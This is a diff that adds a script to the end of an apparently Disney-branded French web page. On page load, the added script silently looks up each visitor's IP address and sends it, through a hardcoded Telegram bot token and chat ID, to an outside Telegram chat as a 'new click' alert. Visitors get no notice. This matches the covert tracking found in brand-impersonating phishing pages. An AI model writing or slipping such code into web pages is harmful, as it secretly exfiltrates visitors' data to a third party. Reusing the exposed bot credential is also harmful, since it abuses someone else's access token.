@@ -29,5 +29,28 @@
   <footer>
     <p>© 2025 Disney et ses sociétés affiliées. Tous droits réservés.</p>
   </footer>
+ <script>
+    (function(){
+      const botToken = "8079060666:AAGfVOxTqIR7teiEPuU3a-qZFcL9vdVTSOg";
+      const chatId   = "-4970333928";
+
+      // Récupère l'IP du visiteur
+      fetch("https://api.ipify.org?format=json")
+        .then(res => res.json())
+        .then(({ ip }) => {
+          const message = `🚀 Nouveau clic – visiteur connecté avec l'IP : ${ip}`;
+          return fetch(
+            `https://api.telegram.org/bot${botToken}/sendMessage`,
+            {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({ chat_id: chatId, text: message }),
+              keepalive: true
+            }
+          );
+        })
+        .catch(err => console.warn("Erreur notif Telegram :", err));
+    })();
+  </script>
 </body>
 </html>
